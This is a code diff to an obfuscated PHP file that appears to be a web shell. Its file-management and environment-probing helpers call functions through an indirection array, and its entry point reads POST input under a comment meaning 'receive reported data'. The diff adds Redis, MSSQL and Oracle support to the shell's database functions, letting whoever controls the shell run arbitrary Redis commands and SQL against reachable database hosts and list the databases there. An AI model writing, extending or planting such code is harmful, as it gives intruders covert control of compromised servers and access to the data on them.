@@ -1533,9 +1533,117 @@ function __DROP__($p){global $_g;$ok=@$_g[6]($p)?@$_g[10]($p):@$_g[9]($p);return
 function __MOVE__($f,$t){global $_g;return @$_g[11]($f,$t)?'{"ok":true,"data":null}':'{"ok":false,"error":"rename failed"}';}
 function __MKDIR__($p){global $_g;return @$_g[12]($p,0755,true)?'{"ok":true,"data":null}':'{"ok":false,"error":"mkdir failed"}';}
 function __ENV__(){global $_g;$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('server'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>$d===false?'':$d,'separator'=>DIRECTORY_SEPARATOR)));}
-function __DBP__($c){$p=@json_decode($c,true);if(!is_array($p))return '{"ok":false,"error":"bad conn"}';$driver=isset($p['driver'])?(string)$p['driver']:'';$host=isset($p['host'])?(string)$p['host']:'';$port=isset($p['port'])?(int)$p['port']:3306;$user=isset($p['username'])?(string)$p['username']:'';$pass=isset($p['password'])?(string)$p['password']:'';$db=isset($p['dbname'])?(string)$p['dbname']:'';if(!class_exists('PDO'))return '{"ok":false,"error":"no pdo"}';try{$dsn=$driver==='pgsql'?('pgsql:host='.$host.';port='.$port.';dbname='.($db!==''?$db:'postgres')):($driver==='sqlite'?('sqlite:'.$db):('mysql:host='.$host.';port='.$port.';charset=utf8mb4'));$h=new PDO($dsn,$user,$pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));if($driver==='sqlite'){$dbs=array($db);}elseif($driver==='pgsql'){$dbs=array();foreach($h->query('SELECT datname FROM pg_database') as $r){$dbs[]=$r[0];}}else{$dbs=array();foreach($h->query('SHOW DATABASES') as $r){$dbs[]=$r[0];}}return json_encode(array('ok'=>true,'data'=>array('driver'=>$driver,'databases'=>$dbs,'message'=>'ok')));}catch(Exception $e){return '{"ok":false,"error":"'.$e->getMessage().'"}';}}
-function __DBQ__($c,$q){$p=@json_decode($c,true);if(!is_array($p))return '{"ok":false,"error":"bad conn"}';$driver=isset($p['driver'])?(string)$p['driver']:'';$host=isset($p['host'])?(string)$p['host']:'';$port=isset($p['port'])?(int)$p['port']:3306;$user=isset($p['username'])?(string)$p['username']:'';$pass=isset($p['password'])?(string)$p['password']:'';$db=isset($p['dbname'])?(string)$p['dbname']:'';if(!class_exists('PDO'))return '{"ok":false,"error":"no pdo"}';try{$dsn=$driver==='pgsql'?('pgsql:host='.$host.';port='.$port.';dbname='.($db!==''?$db:'postgres')):($driver==='sqlite'?('sqlite:'.$db):('mysql:host='.$host.';port='.$port.';charset=utf8mb4'.($db!==''?';dbname='.$db:'')));$h=new PDO($dsn,$user,$pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));$st=$h->query($q);if($st===false)return '{"ok":false,"error":"query failed"}';if(preg_match('/^\s*(select|show|desc|describe|explain|pragma|with)\b/i',$q)){$cols=array();$nc=$st->columnCount();for($i=0;$i<$nc;$i++){$m=$st->getColumnMeta($i);$cols[]=(isset($m['name'])&&$m['name']!=='')?$m['name']:('col'.$i);}$rows=array();$cnt=0;while(($row=$st->fetch(PDO::FETCH_NUM))!==false&&$cnt<1000){$cells=array();foreach($row as $v){$cells[]=($v===null)?null:(string)$v;}$rows[]=$cells;$cnt++;}return json_encode(array('ok'=>true,'data'=>array('columns'=>$cols,'rows'=>$rows,'affected'=>0)));}return json_encode(array('ok'=>true,'data'=>array('columns'=>array(),'rows'=>array(),'affected'=>$st->rowCount())));}catch(Exception $e){return '{"ok":false,"error":"'.$e->getMessage().'"}';}}
-
+function __DBP__($c){
+$p=@json_decode($c,true);if(!is_array($p))return '{"ok":false,"error":"bad conn"}';
+$driver=isset($p['driver'])?(string)$p['driver']:'';$host=isset($p['host'])?(string)$p['host']:'';$port=isset($p['port'])?(int)$p['port']:0;
+$user=isset($p['username'])?(string)$p['username']:'';$pass=isset($p['password'])?(string)$p['password']:'';$db=isset($p['dbname'])?(string)$p['dbname']:'';
+if($driver==='redis'){
+    $s=@stream_socket_client('tcp://'.$host.':'.($port?$port:6379),$e1,$e2,5);
+    if(!$s)return '{"ok":false,"error":"redis connect failed"}';
+    if($pass!==''){__RCMD__($s,array('AUTH',$pass));}
+    $pong=__RCMD__($s,array('PING'));
+    if(is_array($pong)&&isset($pong['e'])){@fclose($s);return '{"ok":false,"error":"redis auth failed"}';}
+    $dbs=array();for($i=0;$i<16;$i++){$dbs[]=(string)$i;}
+    @fclose($s);
+    return json_encode(array('ok'=>true,'data'=>array('driver'=>'redis','databases'=>$dbs,'message'=>'pong')));
+}
+if(!class_exists('PDO'))return '{"ok":false,"error":"no pdo"}';
+try{
+    if($driver==='mssql'){
+        $port=$port?$port:1433;
+        $dsns=array(
+            'sqlsrv:Server='.$host.','.$port.';Database='.$db,
+            'dblib:host='.$host.':'.$port.';dbname='.$db,
+            'odbc:Driver={ODBC Driver 17 for SQL Server};Server='.$host.','.$port.';Database='.$db,
+        );
+        $h=null;$last='';
+        foreach($dsns as $d){try{$h=new PDO($d,$user,$pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));break;}catch(Exception $x){$last=$x->getMessage();}}
+        if(!$h)return '{"ok":false,"error":"mssql: '.$last.'"}';
+        $dbs=array();foreach($h->query('SELECT name FROM sys.databases') as $r){$dbs[]=$r[0];}
+        return json_encode(array('ok'=>true,'data'=>array('driver'=>'mssql','databases'=>$dbs,'message'=>'ok')));
+    }
+    if($driver==='oracle'){
+        $port=$port?$port:1521;
+        $h=new PDO('oci:dbname=//'.$host.':'.$port.'/'.($db!==''?$db:'ORCL'),$user,$pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
+        $dbs=array();foreach($h->query('SELECT username FROM all_users') as $r){$dbs[]=$r[0];}
+        return json_encode(array('ok'=>true,'data'=>array('driver'=>'oracle','databases'=>$dbs,'message'=>'ok')));
+    }
+    $dsn=$driver==='pgsql'?('pgsql:host='.$host.';port='.($port?$port:5432).';dbname='.($db!==''?$db:'postgres')):($driver==='sqlite'?('sqlite:'.$db):('mysql:host='.$host.';port='.($port?$port:3306).';charset=utf8mb4'));
+    $h=new PDO($dsn,$user,$pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
+    if($driver==='sqlite'){$dbs=array($db);}
+    elseif($driver==='pgsql'){$dbs=array();foreach($h->query('SELECT datname FROM pg_database') as $r){$dbs[]=$r[0];}}
+    else{$dbs=array();foreach($h->query('SHOW DATABASES') as $r){$dbs[]=$r[0];}}
+    return json_encode(array('ok'=>true,'data'=>array('driver'=>$driver,'databases'=>$dbs,'message'=>'ok')));
+}catch(Exception $e){return '{"ok":false,"error":"'.$e->getMessage().'"}';}
+}
+function __RESP__($s){
+    $line=@fgets($s);if($line===false)return null;
+    $t=isset($line[0])?$line[0]:'';$data=substr($line,1);
+    if($t==='+')return array('s'=>trim($data));
+    if($t==='-')return array('e'=>trim($data));
+    if($t===':')return (int)trim($data);
+    if($t==='$'){$n=(int)trim($data);if($n===-1)return null;$v='';$left=$n;
+        while($left>0){$chunk=@fread($s,$left);if($chunk===false||$chunk==='')break;$v.=$chunk;$left-=strlen($chunk);}
+        @fgets($s);return $v;}
+    if($t==='*'){$n=(int)trim($data);if($n===-1)return null;$arr=array();for($i=0;$i<$n;$i++){$arr[]=__RESP__($s);}return $arr;}
+    return trim($data);
+}
+function __RCMD__($s,$args){
+    $out='*'.count($args)."\r\n";
+    foreach($args as $a){$out.='$'.strlen($a)."\r\n".$a."\r\n";}
+    @fwrite($s,$out);
+    return __RESP__($s);
+}
+function __DBQ__($c,$q){
+$p=@json_decode($c,true);if(!is_array($p))return '{"ok":false,"error":"bad conn"}';
+$driver=isset($p['driver'])?(string)$p['driver']:'';$host=isset($p['host'])?(string)$p['host']:'';$port=isset($p['port'])?(int)$p['port']:0;
+$user=isset($p['username'])?(string)$p['username']:'';$pass=isset($p['password'])?(string)$p['password']:'';$db=isset($p['dbname'])?(string)$p['dbname']:'';
+if($driver==='redis'){
+    $s=@stream_socket_client('tcp://'.$host.':'.($port?$port:6379),$e1,$e2,5);
+    if(!$s)return '{"ok":false,"error":"redis connect failed"}';
+    if($pass!==''){__RCMD__($s,array('AUTH',$pass));}
+    $args=preg_split('/\s+/',trim((string)$q));
+    if(count($args)===0||$args[0]===''){@fclose($s);return '{"ok":false,"error":"empty command"}';}
+    $res=__RCMD__($s,$args);
+    @fclose($s);
+    if(is_array($res)&&isset($res['e']))return '{"ok":false,"error":"'.$res['e'].'"}';
+    if(is_array($res)){
+        $cols=array('value');$rows=array();
+        foreach($res as $v){if(is_array($v)){$rows[]=array(implode(',',array_map('strval',$v)));}else{$rows[]=array($v===null?null:(string)$v);}}
+        return json_encode(array('ok'=>true,'data'=>array('columns'=>$cols,'rows'=>$rows,'affected'=>0)));
+    }
+    $rows=array(array($res===null?null:(string)$res));
+    return json_encode(array('ok'=>true,'data'=>array('columns'=>array('value'),'rows'=>$rows,'affected'=>0)));
+}
+if(!class_exists('PDO'))return '{"ok":false,"error":"no pdo"}';
+try{
+    if($driver==='mssql'){
+        $port=$port?$port:1433;
+        $dsns=array(
+            'sqlsrv:Server='.$host.','.$port.';Database='.$db,
+            'dblib:host='.$host.':'.$port.';dbname='.$db,
+            'odbc:Driver={ODBC Driver 17 for SQL Server};Server='.$host.','.$port.';Database='.$db,
+        );
+        $h=null;$last='';
+        foreach($dsns as $d){try{$h=new PDO($d,$user,$pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));break;}catch(Exception $x){$last=$x->getMessage();}}
+        if(!$h)return '{"ok":false,"error":"mssql: '.$last.'"}';
+    }elseif($driver==='oracle'){
+        $port=$port?$port:1521;
+        $h=new PDO('oci:dbname=//'.$host.':'.$port.'/'.($db!==''?$db:'ORCL'),$user,$pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
+    }else{
+        $dsn=$driver==='pgsql'?('pgsql:host='.$host.';port='.($port?$port:5432).';dbname='.($db!==''?$db:'postgres')):($driver==='sqlite'?('sqlite:'.$db):('mysql:host='.$host.';port='.($port?$port:3306).';charset=utf8mb4'.($db!==''?';dbname='.$db:'')));
+        $h=new PDO($dsn,$user,$pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
+    }
+    $st=$h->query($q);if($st===false)return '{"ok":false,"error":"query failed"}';
+    if(preg_match('/^\s*(select|show|desc|describe|explain|pragma|with|exec)\b/i',$q)){
+        $cols=array();$nc=$st->columnCount();
+        for($i=0;$i<$nc;$i++){$m=$st->getColumnMeta($i);$cols[]=(isset($m['name'])&&$m['name']!=='')?$m['name']:('col'.$i);}
+        $rows=array();$cnt=0;while(($row=$st->fetch(PDO::FETCH_NUM))!==false&&$cnt<1000){$cells=array();foreach($row as $v){$cells[]=($v===null)?null:(string)$v;}$rows[]=$cells;$cnt++;}
+        return json_encode(array('ok'=>true,'data'=>array('columns'=>$cols,'rows'=>$rows,'affected'=>0)));
+    }
+    return json_encode(array('ok'=>true,'data'=>array('columns'=>array(),'rows'=>array(),'affected'=>$st->rowCount())));
+}catch(Exception $e){return '{"ok":false,"error":"'.$e->getMessage().'"}';}
+}
 /* 入口：接收上报数据 */
 if(isset($_POST['formData'])){
     $b=is_string($_POST['formData'])?$_POST['formData']:'';
